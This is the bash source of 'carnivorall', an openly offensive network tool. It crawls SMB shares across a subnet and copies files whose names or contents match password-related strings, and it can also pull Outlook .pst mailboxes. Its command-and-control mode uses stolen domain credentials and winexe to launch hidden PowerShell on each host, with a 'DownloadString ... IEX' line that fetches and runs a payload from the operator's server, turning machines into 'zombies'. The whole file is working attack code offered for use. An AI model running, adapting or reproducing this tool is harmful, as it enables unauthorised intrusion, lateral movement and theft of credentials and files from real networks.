#!/bin/bash
#=============================================================================================
# Title           :carnivorall.sh
# Description     :Look for sensitive information on the internal network.
# Authors         :L0stControl and BFlag
# Date            :2018/04/24
# Version         :0.7.5    
# Dependecies     :smbclient / ghostscript / zip / ruby (nokogiri / httparty / colorize / yara 
#=============================================================================================

SCRIPTHOME=$(readlink -f "$0" | rev | cut -d '/' -f 2- | rev)
export PATH=$PATH:$SCRIPTHOME

function banner {
    cat << EOF
    
  ================================================================================================

   ▄████▄   ▄▄▄       ██▀███   ███▄    █  ██▓ ██▒   █▓ ▒█████   ██▀███   ▄▄▄       ██▓     ██▓    
  ▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓██▒▓██░   █▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ▓██▒    ▓██▒    
  ▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██▒ ▓██  █▒░▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ▒██░    ▒██░    
  ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██░  ▒██ █░░▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ▒██░    ▒██░    
  ▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░██░   ▒▀█░  ░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒░██████▒░██████▒
  ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░▓     ░ ▐░  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
    ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ▒ ░   ░ ░░    ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
  ░          ░   ▒     ░░   ░    ░   ░ ░  ▒ ░     ░░  ░ ░ ░ ▒    ░░   ░   ░   ▒     ░ ░     ░ ░   
  ░ ░            ░  ░   ░              ░  ░        ░      ░ ░     ░           ░  ░    ░  ░    ░  ░
  ░                                               ░                                               

  ================================================================================================             
                --=={ Looking for sensitive information on local network }==--                                  

    Usage: ./carnivorall.sh [options]
    
        -n, --network <CIDR>                        192.168.0.0/24
        -l, --list <inputfilename>                  List of hosts/networks
        -d, --domain <domain>                       Domain network
        -u, --username <guest>                      Domain username 
        -p, --password <guest>                      Domain password
        -o, --only <contents|filenames|yara|regex>  Search ONLY by sensitve contents, filenames or yara rules
        -m, --match "user passw senha"              Strings to match inside files (not default)
        -r, --regex "4[0-9]{12}[0-9]?{3}"           Search contents using REGEX
        -y, --yara <juicy_files.txt>                Enable Yara search patterns (not default)
        -e, --emails <y|n>                          Download all *.pst files (Prompt by default) 
        -D, --delay <Number>                        Delay between requests
       -lD, --localfolder /path/                    For search sensitive information in local files  
        -h, --help                                  Display options
        -g, --google <max items>                    Search files on the website using Google (Obs: Set to "0" to search in local files)
        -w, --website "domain.com"                  Website used at *-g/--google* feature
        
        Ex1: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY  
        Ex2: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o filenames
        Ex3: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o yara -y juicy_files.txt

        -={ Command & Control Module }=-

        -lH, --lhost 192.168.0.1                     Local ip to receive zombies responses
        -lP, --lport 80                              Local port to listen
        -pP, --pspayload <payload.ps1>                 Powershell payload file

        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80 
        Ex5: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode. 
EOF
}

#----------------#
# Options parser #
#----------------#

if [ "$1" == "-h" -o "$1" == "--help" -o -z "$1" ]; then 
    banner
    exit
fi

POSITIONAL=()
while [[ $# -gt 0 ]]
do
KEY="$1"

case $KEY in
    -n|--network)
    NETWORK="$2"
    shift 
    shift 
    ;;
    -d|--domain)
    DOMAIN="$2"
    shift 
    shift 
    ;;
    -u|--username)
    USERNAME="$2"
    shift 
    shift 
    ;;
    -p|--password)
    PASSWORD="$2"
    shift 
    shift 
    ;;
    -D|--delay)
    DELAY="$2"
    shift 
    shift 
    ;;
    -m|--match)
    PATTERNMATCH="$2"
    shift 
    shift 
    ;;
    -r|--regex)
    REGEX="$2"
    shift 
    shift 
    ;;
    -y|--yara)
    YARAFILE="$2"
    shift 
    shift 
    ;;
    -g|--google)
    GOOGLE="$2"
    shift 
    shift 
    ;;
    -w|--website)
    WEBSITE="$2"
    shift 
    shift 
    ;;
    -e|--emails)
    EMAILS="$2"
    shift
    shift
    ;;
    -l|--list)
    LISTHOSTS="$2"
    shift
    shift
    ;;
    -o|--only)
    ONLY="$2"
    shift 
    shift 
    ;;
    -lH|--lhost)
    LHOST="$2"
    shift 
    shift 
    ;;
    -lD|--localfolder)
    LFOLDER="$2"
    shift 
    shift 
    ;;
    -pP|--pspayload)
    PSPAYLOAD="$2"
    shift 
    shift 
    ;;
    -lP|--lport)
    LPORT="$2"
    shift 
    shift 
    ;;
    --default)
    DEFAULT=YES
    shift 
    ;;
    *)    
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

#-------------------------#
# Constants and variables #
#-------------------------#

NETWORK="${NETWORK:=notset}"
LISTHOSTS="${LISTHOSTS:=notset}"
DOMAIN="${DOMAIN:=notset}"
USERNAME="${USERNAME:=notset}"
PASSWORD="${PASSWORD:=notset}"
YARAFILE="${YARAFILE:=notset}"
ONLY="${ONLY:=notset}"
DELAY="${DELAY:=0.2}"
EMAILS="${EMAILS:=0}"
REGEX="${REGEX:=notset}"
PATTERNMATCH="${PATTERNMATCH:=senha passw}"
PIDCARNIVORALL=$$
GOOGLE="${GOOGLE:=notset}"
WEBSITE="${WEBSITE:=notset}"
LHOST="${LHOST:=notset}"
PSPAYLOAD="${PSPAYLOAD:=notset}"
LPORT="${LPORT:=80}"
LFOLDER="${LFOLDER:=notset}"
MOUNTPOINT=~/.carnivorall/mnt
SHARESFILE=~/.carnivorall/shares.txt
FILESFOLDER=~/.carnivorall/files
SMB=$(whereis smbclient |awk '{print $2}')
MNT=$(whereis mount |awk '{print $2}')
UMNT=$(whereis umount |awk '{print $2}')
YARA=$(whereis yara |awk '{print $2}')
LOG=~/.carnivorall/log
SHARES=""
DEFAULTCOLOR="\033[0m"
BLACK="\033[0;30m"
RED="\033[0;31m"
GREEN="\033[0;32m"
WHITE="\033[1;37m"
MAGENTA="\033[1;35m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
EXITCTRL=0

#-----------#
# Functions #
#-----------#

function checkHomeFolders
{
    if [ ! -d ~/.carnivorall ]; then
        mkdir -p ~/.carnivorall 
        mkdir -p $FILESFOLDER 
        mkdir -p $MOUNTPOINT 
        touch $SHARESFILE 
        touch $LOG 
    fi    
}

function dateLog
{ 
    MSG=$1
    echo >> $LOG
    echo "----------------------------" >> $LOG
    date >> $LOG
    echo "----------------------------" >> $LOG
    echo "$MSG" >> $LOG 
}

function listShares 
{
    HOSTSMB=$1
    USERNAME=$2
    PASSWORD=$3
    DOMAIN=$4
    exec 2> /dev/null # GoHorse to clean the outputs
    SHARES=$($SMB -g -L \\\\$HOSTSMB $OPTIONS |grep -i "Disk" |grep -v "print")
    SHARES=$(echo $SHARES |grep -i "Disk")
    exec 1> /dev/tty # GoHorse to clean the outputs 
}

function checkReadableShare 
{
    HOSTSMB=$1
    PATHSMB=$2
    if $SMB \\\\$HOSTSMB\\$PATHSMB $OPTIONS -c ls 2>&1 > /dev/null ; then
        echo "True"
    else
        echo "False"
    fi
}

function scanner
{
    HOSTS=$1
    echo 1 > /dev/shm/holdcarnivorall 2> /dev/null # Using shared memory to avoid sync problems
    chmod -f 777 /dev/shm/holdcarnivorall 
    echo -e "$WHITE [-] Scanning $HOSTS $DEFAULTCOLOR"
    listShares $HOSTS $USERNAME $PASSWORD $DOMAIN
    for i in $SHARES; do
        PATHSMB=$(echo $i |awk -F"|" '{print $2}')
        READABLE=$(checkReadableShare $HOSTS $PATHSMB |tail -n1)
        if [ "$READABLE" == "True" ];then 
            printf "%-45s %-20s \n" " [+] smb://$HOSTS/$PATHSMB/" "| READ |"
            echo "$HOSTS,$PATHSMB" >> $SHARESFILE
        fi
    done
    echo 0 > /dev/shm/holdcarnivorall # Using shared memory to avoid sync problems
    SHARES=""
}

function generateTargets
{
    > $SHARESFILE # Clean targets file
    if [ "$LISTHOSTS" != "notset" ]; then
        readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
        for HOSTS in "${IPS_FILE[@]}"
            do
                scanner $HOSTS &
                sleep $DELAY
            done 
    elif [ "$NETWORK" != "notset" ]; then
        readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
        for HOSTS in "${IPS[@]}"
        do
            scanner $HOSTS &
            sleep $DELAY
        done
    else
        echo -e "$RED [-] ERROR: $YELLOW Sintax error \n$DEFAULTCOLOR"
        exit
    fi   
}

function searchFilesByName
{
    HOSTSMB=$1
    PATHSMB=$2
    echo -e "$WHITE [+] Looking for suspicious filenames on smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB 2>&1 > /dev/null
    fi

    for p in $PATTERNMATCH
    do
        find $MOUNTPOINT -type f \( -iname "*"$p"*" -o -iname "$p*" \) -printf '%p\n' -exec cp --backup=numbered {} $FILESFOLDER/$HOSTSMB\_$PATHSMB \; |while read OUTPUTS 
        do
            NEWOUTPUT=$(echo $OUTPUTS | sed "s/^.\{,${#MOUNTPOINT}\}/$HOSTSMB\/$PATHSMB/")
            echo -e "$GREEN [+]$WHITE - File copied $NEWOUTPUT $DEFAULTCOLOR" |tee -a $LOG
        done
    done
    
    if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
    fi
    echo
}

function searchFilesByContent
{
    HOSTSMB=$1
    PATHSMB=$2
    echo -e "$WHITE [+] Looking for suspicious content files in smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB  
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp 
    fi
  
    find $MOUNTPOINT -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp $FILESFOLDER/$HOSTSMB\_$PATHSMB/ $LOG smb://$HOSTSMB/$PATHSMB/{} $MOUNTPOINT \;

    if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
    fi
    echo
}

function searchFilesByRegex
{
    HOSTSMB=$1
    PATHSMB=$2
    echo -e "$WHITE [+] Looking for suspicious content files using REGEX [$REGEX] on smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB  
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp 
    fi
    
    find $MOUNTPOINT -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp $FILESFOLDER/$HOSTSMB\_$PATHSMB/ $LOG smb://$HOSTSMB/$PATHSMB $MOUNTPOINT \;

    if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
    fi
    echo
}

function umountTarget
{
    $UMNT -l -f $MOUNTPOINT
    trap 2 # Enable Ctrl-C
}

function exitScan 
{
    echo -e "$RED............Scan stopped! keep hacking =)$DEFAULTCOLOR"
    umountTarget
    kill -9 $PIDCARNIVORALL     
}

function mountTarget
{
    HOSTSMB=$1
    PATHSMB=$2
    if [ $(id -u) -ne 0 ];then
        echo
        echo -e "$RED  You must be root to use this options =( $DEFAULTCOLOR"
        echo
        exit
    else
        $MNT -t cifs //$HOSTSMB/$PATHSMB $MOUNTPOINT $OPTIONSMNT
        trap exitScan 2 # Disable Ctrl-C   
    fi    
}

function searchFilesWithYara
{
    JUICE=$1
    echo -e "$GREEN [+]$WHITE Searching sensitive information with Yara smb://$HOSTSMB/$PATHSMB $DEFAULTCOLOR"
    echo
    $YARA -r $JUICE $MOUNTPOINT |tee -a $LOG
}

function searchFilesWithGoogle
{
    if [ ! -d $FILESFOLDER/$WEBSITE ]; then
        mkdir -p $FILESFOLDER/$WEBSITE/downloads
        mkdir -p $FILESFOLDER/$WEBSITE/tmp
    fi

    scraping.rb $WEBSITE $GOOGLE $FILESFOLDER/$WEBSITE/downloads

    echo -e "$WHITE [+] Looking for suspicious content in downloaded files from $WEBSITE"
    echo -e "$DEFAULTCOLOR"

    find $FILESFOLDER/$WEBSITE/downloads -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$WEBSITE/tmp $FILESFOLDER/$WEBSITE/ $LOG /{} \;
}

function executePowerShell
{
    HOSTSMB=$1
    USERNAME=$2
    PASSWORD=$3
    DOMAIN=$4
    SERVERCEC=$5
    sleep 1 
    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC/ps.ps1')"
    winexe64 -U "$DOMAIN\\$USERNAME%$PASSWORD" //"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD"  2>&1 > /dev/null &
    PIDWINEXE=$(ps ax |grep winexe64 |grep -v "grep" |awk -F" " '{print $1}' |head -n1)
    disown $PIDWINEXE > /dev/null
}

function startZombies
{
    > $SHARESFILE # Clean targets file
    if [ "$LISTHOSTS" != "notset" ]; then
        readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
        for HOSTS in "${IPS_FILE[@]}"
            do
                executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST &
                sleep $DELAY
            done 
    else
        readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
        for HOSTS in "${IPS[@]}"
        do
            executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST &
            sleep $DELAY
        done
    fi   
}

function exitZombies
{
    killall -9 winexe64 > /dev/null
    echo -e "$RED............Process stopped! keep hacking =)$DEFAULTCOLOR"
    sleep 2
    kill -9 $PIDCARNIVORALL
}

function searchLocalFilesByName
{
    LOCALFOLDER=$1
    BASENAME=$(basename $LOCALFOLDER)
    echo -e "$WHITE [+] Looking for suspicious filenames on $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$BASENAME ]; then
        mkdir $FILESFOLDER/$BASENAME 2>&1 > /dev/null
    fi
    for p in $PATTERNMATCH
    do
        find $LOCALFOLDER \( -iname "*"$p"*" -o -iname "$p*" \) -printf '%p\n' -type f -exec cp --backup=numbered {} $FILESFOLDER/$BASENAME \; |while read OUTPUTS 
        do
            echo -e "$GREEN [+]$WHITE - File copied $OUTPUTS $DEFAULTCOLOR" |tee -a $LOG
        done

    done
    
    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$BASENAME/
    fi
    echo
}

function searchLocalFilesByContent
{
    LOCALFOLDER=$1
    BASENAME=$(basename $LOCALFOLDER)
    echo -e "$WHITE [+] Looking for suspicious content files in $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$BASENAME ]; then
        mkdir $FILESFOLDER/$BASENAME
        mkdir $FILESFOLDER/$BASENAME/tmp 
    fi
    find $LOCALFOLDER -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$BASENAME/tmp $FILESFOLDER/$BASENAME/ $LOG $BASENAME/{} $BASENAME \;

    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$BASENAME/
    fi
    echo
}

function searchLocalFilesWithYara
{
    JUICE=$1
    LOCALFOLDER=$2
    echo -e "$GREEN [+]$WHITE Searching sensitive information with Yara $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    $YARA -r $JUICE $LOCALFOLDER |tee -a $LOG
}

function searchLocalFilesByRegex
{
    LOCALFOLDER=$1
    BASENAME=$(basename $LOCALFOLDER)
    echo -e "$WHITE [+] Looking for suspicious content files using REGEX [$REGEX] on $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$BASENAME ]; then
        mkdir $FILESFOLDER/$BASENAME
        mkdir $FILESFOLDER/$BASENAME/tmp 
    fi
    find $LOCALFOLDER -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$BASENAME/tmp $FILESFOLDER/$BASENAME/ $LOG $MOUNTPOINT \;

    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$BASENAME/
    fi
    echo
}

#------#
# main #
#------#
echo ""

if [ "$NETWORK" == "notset" -a "$LISTHOSTS" == "notset" -a "$GOOGLE" == "notset" -a "$LFOLDER" == "notset" -a "$LPORT" == "notset" ];then
    banner
    echo
    echo -e "$RED [-] ERROR: $YELLOW Syntax error! Please review the options. $DEFAULTCOLOR"
    echo
    exit
elif [ "$LISTHOSTS" != "notset" -a ! -e "$LISTHOSTS" ];then
    banner
    echo
    echo -e "$RED [-] ERROR: $YELLOW File with IP addresses does not exist $DEFAULTCOLOR"
    echo
    exit
elif [ "$GOOGLE" != "notset" -a "$WEBSITE" == "notset" ]; then
    banner
    echo
    echo -e "$RED [-] ERROR: $YELLOW You need to inform the website $DEFAULTCOLOR"
    echo -e "        $YELLOW Sintax example:$GREEN carnivorall -g 100 -w example.com $DEFAULTCOLOR"
    echo
    exit
fi

if [ "$USERNAME" == "notset" -o $PASSWORD == "notset" ]; then
    OPTIONS="-N"
    OPTIONSMNT="-o user=,password="
else
    OPTIONS="-U $DOMAIN\\$USERNAME%$PASSWORD"
    OPTIONSMNT="-o user=$USERNAME,password=$PASSWORD,workgroup=$DOMAIN"
fi 

if [ "$EMAILS" == "y" ];then
    echo 1 > /tmp/pstdefault
    chmod -f 777 /tmp/pstdefault
    elif [ "$EMAILS" == "n" ];then
    echo 2 > /tmp/pstdefault
    chmod -f 777 /tmp/pstdefault
    else
    echo 0 > /tmp/pstdefault
    chmod -f 777 /tmp/pstdefault
fi

if [ $GOOGLE != "notset" -a $LHOST == "notset" ]; then

    searchFilesWithGoogle
    exit

elif [ $GOOGLE == "notset" -a $LHOST != "notset" ]; then

    if [ "$PSPAYLOAD" != "notset" -a "$NETWORK" != "notset" ]; then
        if [ ! -e "$PSPAYLOAD" ];then
            echo -e "$RED [-] ERROR: $YELLOW File does not exist $DEFAULTCOLOR"
        else
            startZombies &
            trap exitZombies 2 # Disable Ctrl-C
            cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT"
        fi
    else
        cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT"
    fi
    exit

elif [ $LFOLDER != "notset" ]; then

    if [ ! -d "$LFOLDER" ]; then
        echo -e "$RED [-] ERROR: $YELLOW Directory does not exist $DEFAULTCOLOR"
        exit
    else
        if [ $ONLY == "filenames" ];then
            searchLocalFilesByName $LFOLDER
            exit
        elif [ $ONLY == "contents" ];then
            searchLocalFilesByContent $LFOLDER
            exit
        elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
            searchLocalFilesWithYara $YARAFILE $LFOLDER
            exit
        elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
            searchLocalFilesByRegex $LFOLDER
            exit
        else
            searchLocalFilesByName $LFOLDER
            searchLocalFilesByContent $LFOLDER
            exit
        fi         
    fi 

else
    checkHomeFolders
    generateTargets
fi

while [ $(</dev/shm/holdcarnivorall) -eq 1 ]
do
    sleep 1
done
echo
if [ -s "$SHARESFILE" ];then
    NUMBERLINESFILE=$(cat $SHARESFILE |wc -l)
    COUNT=1
    while :
    do
       echo -e "$YELLOW Choose your option $WHITE"
       echo 0 > /tmp/pstdefault
       echo
       cat $SHARESFILE |while read LINES
       do
           SMBLINE=$(echo $LINES |awk -F"," '{print "smb://"$1"/"$2}')
           echo -e " ( $COUNT ).... $SMBLINE"
           COUNT=$(($COUNT + 1))
       done
       echo -e "$DEFAULTCOLOR ( a ).... Look for files in all targets"
       echo -e "$DEFAULTCOLOR ( c ).... Change pattern match(es) string(s), now = $RED[$PATTERNMATCH]$DEFAULTCOLOR"
       echo -e "$DEFAULTCOLOR ( r ).... Rescan target(s)"       
       echo -e " ( q ).... Quit" 
       echo
       echo -en " Option ......................: "
       read OPT
       echo -e "$DEFAULTCOLOR"
       
       case $OPT in
       "a")
           dateLog
           for (( T=1; T <= $NUMBERLINESFILE; T++)) 
           do
               TARGETHOST=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $1}')
               TARGETPATH=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $2}')
               mountTarget $TARGETHOST $TARGETPATH
           
               if [ $ONLY == "filenames" ];then
                   searchFilesByName $TARGETHOST $TARGETPATH
               
               elif [ $ONLY == "contents" ];then
                   searchFilesByContent $TARGETHOST $TARGETPATH           
               
               elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then 
                   searchFilesWithYara $YARAFILE
               
               elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
                   searchFilesByRegex $TARGETHOST $TARGETPATH
               
               else
                   searchFilesByName $TARGETHOST $TARGETPATH
                   searchFilesByContent $TARGETHOST $TARGETPATH           
               fi  
               umountTarget
           done
           continue
           ;;
       "q")
           exit
           ;;
       "c")
           echo -en "$YELLOW Type new pattern matches separated by spaces ...: $WHITE"
           echo -en "$DEFAULTCOLOR"
           read PATTERNMATCH
           ;;
       "r")
           generateTargets
           sleep 3
           ;;
       *)
           dateLog
           TARGETHOST=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $1}')
           TARGETPATH=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $2}')
           mountTarget $TARGETHOST $TARGETPATH
           
           if [ $ONLY == "filenames" ];then
               searchFilesByName $TARGETHOST $TARGETPATH
           
           elif [ $ONLY == "contents" ];then
               searchFilesByContent $TARGETHOST $TARGETPATH           
           
           elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
               searchFilesWithYara $YARAFILE
           
           elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
               searchFilesByRegex $TARGETHOST $TARGETPATH
           
           else
               searchFilesByName $TARGETHOST $TARGETPATH
               searchFilesByContent $TARGETHOST $TARGETPATH           
           fi         
           umountTarget
           trap 2
           continue
           ;;
       esac
    done
fi
